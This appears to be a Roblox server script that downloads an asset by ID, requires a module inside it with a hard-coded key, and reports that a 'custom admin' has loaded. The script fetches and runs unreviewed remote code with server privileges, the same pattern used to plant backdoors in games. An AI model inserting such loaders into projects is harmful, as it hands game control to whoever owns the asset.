-- ServerScriptService
local InsertService = game:GetService("InsertService")

local assetId = 129398701546116
local authKey = "ReactorCore_Testing"

local success, model = pcall(function()
	return InsertService:LoadAsset(assetId)
end)

if success and model then
	model.Parent = game.ServerStorage

	local module = model:FindFirstChildWhichIsA("ModuleScript", true)

	if module then
		local successRequire, admin = pcall(function()
			return require(module)(authKey)
		end)

		if successRequire then
			print("Custom admin loaded successfully!")
		else
			warn("Admin module authorization failed:", admin)
		end
	else
		warn("No ModuleScript found in asset.")
	end
else
	warn("Failed to load asset:", model)
end
